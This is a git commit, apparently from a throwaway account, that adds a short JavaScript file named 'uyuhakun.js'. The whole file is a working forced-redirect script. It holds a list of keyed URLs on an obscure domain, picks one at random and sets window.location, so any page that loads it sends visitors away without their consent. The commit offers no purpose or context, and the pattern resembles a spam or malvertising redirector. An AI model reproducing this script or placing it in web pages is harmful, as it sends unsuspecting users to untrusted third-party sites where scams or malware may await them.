70e5e9b94fa9cddee28e7e2ec88e19affb5e7464
insiala2f <84434303+insiala2f@users.noreply.github.com>
2021-05-22 09:33:43 +0800

    Create uyuhakun.js

---
+++ uyuhakun.js
@@ -0,0 +1,9 @@
+  var dataUrl = [
+  '//wonderfullytumultbizarre.com/k78nwxfv?key=e668079d92f5c385e97d9e9f30beedd3',
+  '//wonderfullytumultbizarre.com/ezuq8wdg?key=abe65c5f1fac7c85a5e79772f3e4b4ab',
+  '//wonderfullytumultbizarre.com/rmdh7vzvs?key=ed9adfc3b8491179ad53c3e027d8b8a9',
+  '//wonderfullytumultbizarre.com/mcq9dwrp?key=26877099e93b852a73d06043b22429bd',
+  '//wonderfullytumultbizarre.com/jrzhg39q?key=c57734d92ebaa11a56b389a5ea6dd78e'
+];
+var randomItem = dataUrl[Math.floor(Math.random()*dataUrl.length)];
+window.location = randomItem;
